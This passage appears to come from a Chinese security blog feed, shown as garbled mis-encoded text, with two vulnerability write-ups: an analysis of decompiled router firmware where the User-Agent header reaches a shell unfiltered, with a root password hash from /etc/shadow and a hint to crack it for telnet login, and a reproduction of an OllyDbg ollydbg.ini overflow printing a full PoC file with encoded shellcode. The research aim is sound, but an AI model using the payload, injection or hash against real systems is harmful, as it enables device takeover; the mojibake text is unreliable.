<p>æ ¹æ®æŠ«éœ²ä¿¡æ¯ï¼Œå¯ä»¥å®šä½åˆ°å‡½æ•° httpRpmWmbParseï¼Œåœ¨ç¬¬ 89 è¡Œä½ç½®å­˜åœ¨å¦‚ä¸‹ä»£ç </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">  __haystack = (<span class="type">char</span> *)httpGetEnv(param_1,<span class="string">&quot;USER_AGENT&quot;</span>);</span><br><span class="line">  iVar2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    pcVar6 = <span class="built_in">strstr</span>(__haystack,&amp;DAT_004b11e0 + iVar2);</span><br><span class="line">    iVar2 = iVar2 + <span class="number">0xf</span>;</span><br><span class="line">    <span class="keyword">if</span> (pcVar6 != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      PRINTF_ECHO(<span class="string">&quot;Mobile Agent: %s&quot;</span>,__haystack);</span><br><span class="line">      DAT_004b3718 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LAB_0047e8e0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (iVar2 != <span class="number">0xd2</span>);</span><br></pre></td></tr></table></figure></div>

<p>å’Œè®¸å¤šå›ºä»¶ä¸€æ ·ï¼Œè¿™é‡Œä¼šä»å½“å‰ç¯å¢ƒå˜é‡ä¸­å–å¾—ç›¸åº”çš„æ•°æ®ï¼Œç„¶åå¯¹å…¶è¿›è¡Œä¸€ç³»åˆ—æ“ä½œã€‚</p>
<p>é¦–å…ˆä»ç¯å¢ƒå˜é‡ä¸­å–å¾— user-agent å­—æ®µï¼Œç„¶ååˆ©ç”¨ strstr å‡½æ•°åˆ¤æ–­å…¶ä¸­æ˜¯å¦å­˜åœ¨æŸäº›å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">iPod</span><br><span class="line">iPod touch</span><br><span class="line">iPhone</span><br><span class="line">Mobile Safari ç­‰</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœå­˜åœ¨è¿™äº›å­—ç¬¦ä¸²å…¶ä¸­ä¸€ä¸ªï¼Œå°±ä½¿ç”¨ PRINTF_ECHO å°†å…¶æ‰“å°åˆ°ç»ˆç«¯</p>
<p>PRINTF_ECHO å‡½æ•°å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PRINTF_ECHO</span><span class="params">(<span class="type">char</span> *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined4 local_res4;</span><br><span class="line">  undefined4 local_res8;</span><br><span class="line">  undefined4 local_resc;</span><br><span class="line">  <span class="type">char</span> acStack268 [<span class="number">260</span>];</span><br><span class="line">  </span><br><span class="line">  local_res4 = param_2;</span><br><span class="line">  local_res8 = param_3;</span><br><span class="line">  local_resc = param_4;</span><br><span class="line">  <span class="built_in">memset</span>(acStack268,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">vsprintf</span>(acStack268,param_1,&amp;local_res4);</span><br><span class="line">  execFormatCmd(<span class="string">&quot;echo \&quot;====&gt;&gt;&gt;&gt;%s\&quot; &gt; /dev/console \r\n&quot;</span>,acStack268);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>Ghidra çš„å‚æ•°è¯†åˆ«æœ‰ä¸€äº›å¼‚å¸¸ï¼Œä½†æ˜¯åç¼–è¯‘ç»“æœæ˜¯æ­£ç¡®çš„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸² â€œMobile Agent: %sâ€ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å–å¾—çš„ user-agent å­—æ®µã€‚</p>
<p>æ¥ç€è°ƒç”¨ execFormatCmd å‡½æ•°ï¼Œå†…å®¹å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">execFormatCmd</span><span class="params">(<span class="type">char</span> *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined4 local_res4;</span><br><span class="line">  undefined4 local_res8;</span><br><span class="line">  undefined4 local_resc;</span><br><span class="line">  <span class="type">char</span> acStack268 [<span class="number">264</span>];</span><br><span class="line">  </span><br><span class="line">  local_res4 = param_2;</span><br><span class="line">  local_res8 = param_3;</span><br><span class="line">  local_resc = param_4;</span><br><span class="line">  <span class="built_in">vsprintf</span>(acStack268,param_1,&amp;local_res4);</span><br><span class="line">  FUN_0040b740(acStack268);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ­¤å‡½æ•°ä¼šåˆ©ç”¨ vfprintf å°†å¤–é¢ä¼ è¿›æ¥çš„å‚æ•°æ”¾åœ¨ stack 268 ä¸­ï¼Œç„¶åè°ƒç”¨å‡½æ•° FUN_0040b740</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">FUN_0040b740</span><span class="params">(<span class="type">int</span> param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__pid_t</span> __pid;</span><br><span class="line">  undefined4 uVar1;</span><br><span class="line">  <span class="type">__pid_t</span> _Var2;</span><br><span class="line">  <span class="type">int</span> *piVar3;</span><br><span class="line">  <span class="type">int</span> local_30;</span><br><span class="line">  <span class="type">char</span> *local_2c;</span><br><span class="line">  undefined *local_28;</span><br><span class="line">  <span class="type">int</span> local_24;</span><br><span class="line">  undefined4 local_20;</span><br><span class="line">  <span class="type">int</span> local_18;</span><br><span class="line">  </span><br><span class="line">  local_30 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (param_1 == <span class="number">0</span>) &#123;</span><br><span class="line">    uVar1 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    local_18 = param_1;</span><br><span class="line">    __pid = fork();</span><br><span class="line">    uVar1 = <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="keyword">if</span> (__pid != <span class="number">-1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (__pid == <span class="number">0</span>) &#123;</span><br><span class="line">        local_2c = <span class="string">&quot;sh&quot;</span>;</span><br><span class="line">        local_24 = local_18;</span><br><span class="line">        local_28 = &amp;DAT_004916fc;</span><br><span class="line">        local_20 = <span class="number">0</span>;</span><br><span class="line">        execve(<span class="string">&quot;/bin/sh&quot;</span>,&amp;local_2c,(<span class="type">char</span> **)<span class="number">0x0</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0x7f</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        _Var2 = waitpid(__pid,&amp;local_30,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (_Var2 != <span class="number">-1</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> local_30;</span><br><span class="line">        &#125;</span><br><span class="line">        piVar3 = __errno_location();</span><br><span class="line">        uVar1 = <span class="number">0xffffffff</span>;</span><br><span class="line">      &#125; <span class="keyword">while</span> (*piVar3 == <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç›´æ¥ä½¿ç”¨ execve æ‹¼æ¥ä¸Šé¢çš„å‘½ä»¤ç„¶åæ‰§è¡Œï¼Œè¿‡ç¨‹ä¸­ä¸å­˜åœ¨å¯¹å‚æ•°çš„è¿‡æ»¤ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡æ„é€ åˆé€‚çš„ user-agent å­—æ®µæ¥è¾¾åˆ° RCE çš„ç›®çš„ã€‚</p>
<h2 id="re365-çš„å…¶ä»–å‡ ä¸ªæ¼æ´"><a href="#re365-çš„å…¶ä»–å‡ ä¸ªæ¼æ´" class="headerlink" title="re365 çš„å…¶ä»–å‡ ä¸ªæ¼æ´"></a>re365 çš„å…¶ä»–å‡ ä¸ªæ¼æ´</h2><p>ç»†å¿ƒçš„åŒå­¦åº”è¯¥ä¼šå‘ç°ï¼Œåœ¨å‡½æ•° PRINTF_ECHO ä»¥åŠåé¢çš„ execFormatCmd éƒ½æœ‰ vfprintf å‡½æ•°ï¼Œä½†æ˜¯åœ¨ä½¿ç”¨è¿™äº›å‡½æ•°çš„æ—¶å€™æ²¡æœ‰æ£€éªŒä¸€ä¸‹æºå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå› ä¸º user-agent æ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯å­˜åœ¨æ ˆæº¢å‡ºçš„ã€‚</p>
<p>å¦å¤–åœ¨ &#x2F;etc&#x2F;shadow æ–‡ä»¶ä¸­æœ‰ä»¥ä¸‹æ•°æ®</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$1$GTN.gpri$DlSyKvZKMR9A9Uj9e9wR3/:15502:0:99999:7:::</span><br></pre></td></tr></table></figure></div>

<p>æ„Ÿå…´è¶£çš„å¯ä»¥è‡ªå·±æœç´¢ä¸€ä¸‹è¿™æ®µå¯†ç ï¼Œè®¾å¤‡é»˜è®¤åº”è¯¥æ˜¯å¼€æ”¾äº†å¸¦æœ‰å¯†ç çš„ telnetï¼Œå¾—åˆ°è¿™ä¸²å¯†ç çš„æ˜æ–‡æˆ‘ä»¬ä¼¼ä¹å°±å¯ä»¥ç›´æ¥ç™»å½•è®¾å¤‡äº†ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>OllyDBG ollydbg.ini ç¼“å†²åŒºæº¢å‡ºæ¼æ´å¤ç°</title>
    <url>/2020/02/25/ODBUG/</url>
    <content><![CDATA[<p>é—²æ¥æ— äº‹å¤ç°ä¸€ä¸ª ollydbg çš„æ´ã€‚</p>
<span id="more"></span>

<h2 id="æ¼æ´ä¿¡æ¯"><a href="#æ¼æ´ä¿¡æ¯" class="headerlink" title="æ¼æ´ä¿¡æ¯"></a>æ¼æ´ä¿¡æ¯</h2><p>æ¼æ´å¯ä»¥åœ¨çŸ¥é“åˆ›å®‡çš„æ¼æ´ç»„ä»¶ä¸­æ‰¾åˆ°</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.seebug.org/vuldb/ssvid-3876</span><br></pre></td></tr></table></figure></div>

<p>ä¸è¿‡å®ƒå¹´ä»£ä¹…è¿œï¼Œé‡Œé¢çš„å…·ä½“ä¿¡æ¯é“¾æ¥å·²ç»å¤±æ•ˆäº†ï¼Œç»è¿‡ google å‘ç°äº†ä¸€ä¸ªç›¸å…³é“¾æ¥</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://arabteam2000-forum.com/index.php?/topic/168295-ollydbg-110-local-buffer-overflow-exploit/</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªé¡µé¢è²Œä¼¼æ˜¯ä¸­ä¸œé‚£è¾¹çš„è®ºå›ï¼Œè°·æ­Œç¿»è¯‘å‹‰å¼ºèƒ½çœ‹æ‡‚ä¸€ç‚¹ï¼Œå¹¸å¥½å¸–å­ä¸­ç»™å‡ºäº†å…³äºè¿™ä¸ªæ¼æ´çš„æ¼”ç¤ºè§†é¢‘ä»¥åŠ payloadï¼Œä½†æ˜¯ä¸åŒ…å«è¯¦ç»†çš„æ¼æ´æˆå› ï¼Œå‡ºäºå¥½å¥‡å°è¯•å¯¹æ­¤æ¼æ´è¿›è¡Œåˆ†æã€‚</p>
<h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>ç®€å•çœ‹äº†ä¸€ä¸‹è§†é¢‘ï¼ŒåŠ ä¸Šç»™å‡ºçš„ POC æˆåŠŸè§¦å‘æ¼æ´ã€‚å…¶ä¸­ POC å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Settings]</span><br><span class="line">Check DLL versions = 0</span><br><span class="line">Show toolbar =1</span><br><span class="line">Status in toolbar =0</span><br><span class="line">Use hardware breakpoints to step =0</span><br><span class="line">Restore windows =1</span><br><span class="line">Scroll MDI =0</span><br><span class="line">Horizontal scroll =0</span><br><span class="line">Topmost window =0</span><br><span class="line">Index of default font =1</span><br><span class="line">Index of default colours =0</span><br><span class="line">Index of default syntax highlighting =0</span><br><span class="line">Log buffer size index =0</span><br><span class="line">Run trace buffer size index =1</span><br><span class="line">Group adjacent commands in profile =1</span><br><span class="line">Highlighted trace register =-1</span><br><span class="line">IDEAL disassembling mode =0</span><br><span class="line">Disassemble in lowercase =0</span><br><span class="line">Separate arguments with TAB =0</span><br><span class="line">Extra space between arguments =0</span><br><span class="line">Show default segments =1</span><br><span class="line">NEAR jump modifiers =0</span><br><span class="line">Use short form of string commands =0</span><br><span class="line">Use RET instead of RETN =0</span><br><span class="line">Size sensitive mnemonics =1</span><br><span class="line">SSE size decoding mode =0</span><br><span class="line">Top of FPU stack =1</span><br><span class="line">Always show memory size =1</span><br><span class="line">Decode registers for any IP =0</span><br><span class="line">Show symbolic addresses =1</span><br><span class="line">Show local module names =1</span><br><span class="line">Gray data used as filling =1</span><br><span class="line">Show jump direction =1</span><br><span class="line">Show jump path =0</span><br><span class="line">Show jumpfrom path =0</span><br><span class="line">Show path if jump is not taken =0</span><br><span class="line">Underline fixups =1</span><br><span class="line">Center FOLLOWed command =0</span><br><span class="line">Show stack frames =1</span><br><span class="line">Show local names in stack =1</span><br><span class="line">Extended stack trace =0</span><br><span class="line">Synchronize source with CPU =0</span><br><span class="line">Include SFX extractor in code =0</span><br><span class="line">SFX trace mode =0</span><br><span class="line">Use real SFX entry from previous run =1</span><br><span class="line">Ignore SFX exceptions =0</span><br><span class="line">First pause =2</span><br><span class="line">Stop on new DLL =0</span><br><span class="line">Stop on DLL unload =0</span><br><span class="line">Stop on new thread =0</span><br><span class="line">Stop on thread end =0</span><br><span class="line">Stop on debug string =0</span><br><span class="line">Decode SSE registers =0</span><br><span class="line">Enable last error =1</span><br><span class="line">Ignore access violations in KERNEL32 =1</span><br><span class="line">Ignore INT3 =0</span><br><span class="line">Ignore TRAP =0</span><br><span class="line">Ignore access violations =0</span><br><span class="line">Step in unknown commands =0</span><br><span class="line">Ignore division by 0 =0</span><br><span class="line">Ignore illegal instructions =0</span><br><span class="line">Ignore all FPU exceptions =0</span><br><span class="line">Warn when frequent breaks =0</span><br><span class="line">Warn when break not in code =1</span><br><span class="line">Autoreturn =0</span><br><span class="line">Save original command in trace =0</span><br><span class="line">Show traced ESP =0</span><br><span class="line">Show traced flags =0</span><br><span class="line">Animate over system DLLs =0</span><br><span class="line">Trace over string commands =0</span><br><span class="line">Synchronize CPU and Run trace =0</span><br><span class="line">Ignore custom exceptions =0</span><br><span class="line">Smart update =1</span><br><span class="line">Set high priority =1</span><br><span class="line">Append arguments =1</span><br><span class="line">Use ExitProcess =1</span><br><span class="line">Allow injection to get WinProc =0</span><br><span class="line">Sort WM_XXX by name =0</span><br><span class="line">Type of last WinProc breakpoint =0</span><br><span class="line">Snow-free drawing =0</span><br><span class="line">Demangle symbolic names =0</span><br><span class="line">Keep ordinal in name =1</span><br><span class="line">Only ASCII printable in dump =0</span><br><span class="line">Allow diacritical symbols =0</span><br><span class="line">String decoding =3</span><br><span class="line">Warn if not administrator =1</span><br><span class="line">Warn when terminating process =1</span><br><span class="line">Align dialogs =1</span><br><span class="line">Use font of calling window =0</span><br><span class="line">Specified dialog font =0</span><br><span class="line">Number of lines that follow EIP =0</span><br><span class="line">Restore window positions =1</span><br><span class="line">Restore width of columns =0</span><br><span class="line">Highlight sorted column =0</span><br><span class="line">Compress analysis data =1</span><br><span class="line">Backup UDD files =1</span><br><span class="line">Fill rest of command with NOPs =1</span><br><span class="line">Reference search mode =0</span><br><span class="line">Global search =1</span><br><span class="line">Aligned search =0</span><br><span class="line">Allow error margin =0</span><br><span class="line">Keep size of hex edit selection =1</span><br><span class="line">Modify tag of FPU register =1</span><br><span class="line">Hex inspector limits =1</span><br><span class="line">MMX display mode =0</span><br><span class="line">Last selected options card =0</span><br><span class="line">Last selected appearance card =0</span><br><span class="line">Ignore case in text search =1</span><br><span class="line">Letter key in Disassembler =1</span><br><span class="line">Looseness of code analysis =1</span><br><span class="line">Decode pascal strings =1</span><br><span class="line">Guess number of arguments =1</span><br><span class="line">Accept far calls and returns =0</span><br><span class="line">Accept direct segment modifications =0</span><br><span class="line">Decode VxD calls =0</span><br><span class="line">Accept privileged commands =0</span><br><span class="line">Accept I/O commands =0</span><br><span class="line">Accept NOPs =1</span><br><span class="line">Accept shifts out of range =0</span><br><span class="line">Accept superfluous prefixes =0</span><br><span class="line">Accept LOCK prefixes =0</span><br><span class="line">Accept unaligned stack operations =1</span><br><span class="line">Accept non-standard command forms =1</span><br><span class="line">Show ARG and LOCAL in procedures =0</span><br><span class="line">Save analysis to file =1</span><br><span class="line">Analyse main module automatically =1</span><br><span class="line">Analyse code structure =1</span><br><span class="line">Decode ifs as switches =0</span><br><span class="line">Save trace to file =0</span><br><span class="line">Trace contents of registers =1</span><br><span class="line">Functions preserve registers =0</span><br><span class="line">Decode tricks =0</span><br><span class="line">Automatically select register type =0</span><br><span class="line">Show decoded arguments =1</span><br><span class="line">Show decoded arguments in stack =1</span><br><span class="line">Show arguments in call stack =1</span><br><span class="line">Show induced calls =1</span><br><span class="line">Label display mode =0</span><br><span class="line">Label includes module name =0</span><br><span class="line">Highlight symbolic labels =0</span><br><span class="line">Highlight RETURNs in stack =1</span><br><span class="line">Ignore path in user data file =0</span><br><span class="line">Ignore timestamp in user data file =1</span><br><span class="line">Ignore CRC in user data file =0</span><br><span class="line">Default sort mode in Names =1</span><br><span class="line">Save out-of-module user data =0</span><br><span class="line">Tabulate columns in log file =0</span><br><span class="line">Append data to existing log file =0</span><br><span class="line">Flush gathered data to log file =0</span><br><span class="line">Skip spaces in source comments =1</span><br><span class="line">Hide non-existing source files =0</span><br><span class="line">Tab stops =8</span><br><span class="line">File graph mode =2</span><br><span class="line">Show internal handle names =0</span><br><span class="line">Hide irrelevant handles =0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[History]</span><br><span class="line">Executable[0] =C:\Users\lenovo\Desktop\baofeng.exe</span><br><span class="line">View file = </span><br><span class="line">View text file = </span><br><span class="line">Object file = </span><br><span class="line">Import library = </span><br><span class="line">Log file =log.txt</span><br><span class="line">Run trace file =rtrace.txt</span><br><span class="line">API help file = </span><br><span class="line">Text save file = </span><br><span class="line">Symbolic data path =E:\my prog\Cracking Tools\odbg110</span><br><span class="line">UDD path =C:\Users\lenovo\Desktop\ollydbg\ollydbg\UDD</span><br><span class="line">Plugin path =C:\Users\lenovo\Desktop\ollydbg\ollydbg\plugin</span><br><span class="line">Executable[1] =</span><br><span class="line">Executable[2] = </span><br><span class="line">Executable[3] = </span><br><span class="line">Executable[4] = </span><br><span class="line">Executable[5] = </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Arguments]</span><br><span class="line">Executable[1] = </span><br><span class="line">Executable[2] = </span><br><span class="line">Executable[3] = </span><br><span class="line">Executable[4] = </span><br><span class="line">Executable[5] = </span><br><span class="line">Executable[0] = </span><br><span class="line">Argument[1] =&quot;&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAî²è­¿AAAAAAAAAAAAAAAA?Y?æ¡«ï£µï£µï£µOIIIIIIQZVTX630VX4A0B6HH0B30BCVX2BDBH4A2AD0ADTBDQB0ADAVX4Z8BDJOMNOJNFDBPB0BPKXE4N3KXNWE0JGA0ONK8OTJAKHO5BBAPKNIDKHFSKXAPPNA3BLIINJFXBLFWGPALLLM0APDLKNFOKCF5FBF0E7ENK8OUFBAPKNH6KHN0KTKXOENQA0KNKHNQK8APKNIHNUFBF0CLACBLF6K8BTB3EXBLJ7NPKXBDN0KXBGN1MJKHJVJ0KNIPKXBHBKB0BPB0KHJ6NCOUA3HOB6HUI8JOC8BLK7B5JVBOL8F0O5JVJYPOL8P0GUOOGNC6A6NVCVBPZ&quot;&quot;</span><br><span class="line">Argument[2] =sd</span><br><span class="line">Argument[3] =vbn,</span><br><span class="line">Argument[4] =fg</span><br><span class="line">Argument[5] =sss</span><br><span class="line">Argument[0] =æº¥å—œ ç¼ çš‚?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Colours]</span><br><span class="line">Scheme[0] =0,12,8,18,7,8,7,13</span><br><span class="line">Scheme name[0] =Black on white</span><br><span class="line">Scheme[1] =14,12,7,1,3,7,3,13</span><br><span class="line">Scheme name[1] =Yellow on blue</span><br><span class="line">Scheme[2] =1,12,3,11,14,2,7,13</span><br><span class="line">Scheme name[2] =Marine</span><br><span class="line">Scheme[3] =15,12,7,0,8,11,7,13</span><br><span class="line">Scheme name[3] =Mostly black</span><br><span class="line">Scheme[4] =0,12,8,18,7,8,7,13</span><br><span class="line">Scheme name[4] =Scheme 4</span><br><span class="line">Scheme[5] =14,12,7,1,3,7,3,13</span><br><span class="line">Scheme name[5] =Scheme 5</span><br><span class="line">Scheme[6] =1,12,3,11,14,2,7,13</span><br><span class="line">Scheme name[6] =Scheme 6</span><br><span class="line">Scheme[7] =15,12,7,0,8,11,7,13</span><br><span class="line">Scheme name[7] =Scheme 7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Fonts]</span><br><span class="line">Font[0] =12,8,400,0,0,0,255,2,49,0</span><br><span class="line">Face name[0] =Terminal</span><br><span class="line">Font name[0] =OEM fixed font</span><br><span class="line">Font[1] =9,6,700,0,0,0,255,0,48,1</span><br><span class="line">Face name[1] =Terminal</span><br><span class="line">Font name[1] =Terminal 6</span><br><span class="line">Font[2] =15,8,400,0,0,0,178,2,49,0</span><br><span class="line">Face name[2] =Fixedsys</span><br><span class="line">Font name[2] =System fixed font</span><br><span class="line">Font[3] =14,0,400,0,0,0,1,2,5,0</span><br><span class="line">Face name[3] =Courier New</span><br><span class="line">Font name[3] =Courier (UNICODE)</span><br><span class="line">Font[4] =10,6,400,0,0,0,1,2,5,0</span><br><span class="line">Face name[4] =Lucida Console</span><br><span class="line">Font name[4] =Lucida (UNICODE)</span><br><span class="line">Font[5] =9,6,700,0,0,0,255,0,48,0</span><br><span class="line">Face name[5] =Terminal</span><br><span class="line">Font name[5] =Font 5</span><br><span class="line">Font[6] =15,8,400,0,0,0,178,2,49,0</span><br><span class="line">Face name[6] =Fixedsys</span><br><span class="line">Font name[6] =Font 6</span><br><span class="line">Font[7] =14,0,400,0,0,0,1,2,5,0</span><br><span class="line">Face name[7] =Courier New</span><br><span class="line">Font name[7] =Font 7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Syntax]</span><br><span class="line">Commands[0] =0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Operands[0] =0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Scheme name[0] =No highlighting</span><br><span class="line">Commands[1] =0,4,124,112,9,64,64,13,111,8,12,0,0,0</span><br><span class="line">Operands[1] =1,0,4,13,65,1,112,6,0,0,0,0,0,0</span><br><span class="line">Scheme name[1] =Christmas tree</span><br><span class="line">Commands[2] =0,0,124,112,0,64,64,0,96,0,0,0,0,0</span><br><span class="line">Operands[2] =0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Scheme name[2] =Jumps&#x27;n&#x27;calls</span><br><span class="line">Commands[3] =0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Operands[3] =0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Scheme name[3] =Hilite 3</span><br><span class="line">Commands[4] =0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Operands[4] =0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Scheme name[4] =Hilite 4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Plugin Command line]</span><br><span class="line">Restore command line window = 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Plugin Bookmarks]</span><br><span class="line">Restore bookmarks window = 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Placement]</span><br><span class="line">OllyTest =486,83,640,480,1</span><br><span class="line">CPU =0,0,514,366,3</span><br><span class="line">CPU subwindows =529,1198,523,1198,320,649,282,649</span><br><span class="line">CPU subwindows 1=374,767,336,658,450,960,388,853</span><br><span class="line">CPU subwindows 2=374,767,336,658,450,960,388,853</span><br><span class="line">CPU subwindows 3=374,767,336,658,450,960,388,853</span><br><span class="line">CPU subwindows 4=374,767,336,658,450,960,388,853</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Appearance]</span><br><span class="line">CPU scheme =0</span><br><span class="line">CPU Disassembler =1,0,0,0,0</span><br><span class="line">CPU Dump =1,0,1,0,4225,0</span><br><span class="line">CPU Stack =1,0,0,0</span><br><span class="line">CPU Info =1,0,0,0</span><br><span class="line">CPU Registers =1,0,1,0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Columns]</span><br><span class="line">CPU Disassembler =54,102,240,1536</span><br><span class="line">CPU Dump =54,144,54,</span><br><span class="line">CPU Stack =54,60,1536,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Plugin IDAFicator]</span><br><span class="line">PATH_RADASM = C:\Users\lenovo\Desktop\ollydbg\ollydbg\plugin\minimalist-radasm</span><br><span class="line">PATH_HELP = C:\Users\lenovo\Desktop\ollydbg\ollydbg\plugin\IDAFICATOR.hlp</span><br><span class="line">DIA_CUSTOMIZE_SCHEME=0,8388608,32768,8421376,128,8388736,32896,12632256,8421504,16711680,65280,16776960,255,16711935,65535,16777215,12639424,15780004,15793151,10789024</span><br><span class="line">SETTINGS_MAIN=0,0,0,0,0</span><br><span class="line">SETTINGS_DUMP=</span><br><span class="line">SETTINGS_DISASM=0,0,0</span><br><span class="line">SETTINGS_STACK=</span><br><span class="line">SETTINGS_HWBP=0,0,0</span><br><span class="line">SETTINGS_ROTE=</span><br><span class="line">LAYOUT_ID=0</span><br><span class="line">LAYOUT_SWAP_DUMP_STACK=0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Import libraries]</span><br><span class="line">Implib[0] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\MFC42.Lib</span><br><span class="line">Implib[1] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\MFC42d.Lib</span><br><span class="line">Implib[2] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\MFC42u.Lib</span><br><span class="line">Implib[3] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\MFC42ud.Lib</span><br><span class="line">Implib[4] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfc71.Lib</span><br><span class="line">Implib[5] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfc71d.Lib</span><br><span class="line">Implib[6] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfc71u.Lib</span><br><span class="line">Implib[7] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfc71ud.Lib</span><br><span class="line">Implib[8] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfc80d.Lib</span><br><span class="line">Implib[9] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfc80u.Lib</span><br><span class="line">Implib[10] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfc80ud.Lib</span><br><span class="line">Implib[11] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfcd42d.Lib</span><br><span class="line">Implib[12] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfcd42ud.Lib</span><br><span class="line">Implib[13] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfcn42d.Lib</span><br><span class="line">Implib[14] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfcn42ud.Lib</span><br><span class="line">Implib[15] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfco42d.Lib</span><br><span class="line">Implib[16] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfco42ud.Lib</span><br><span 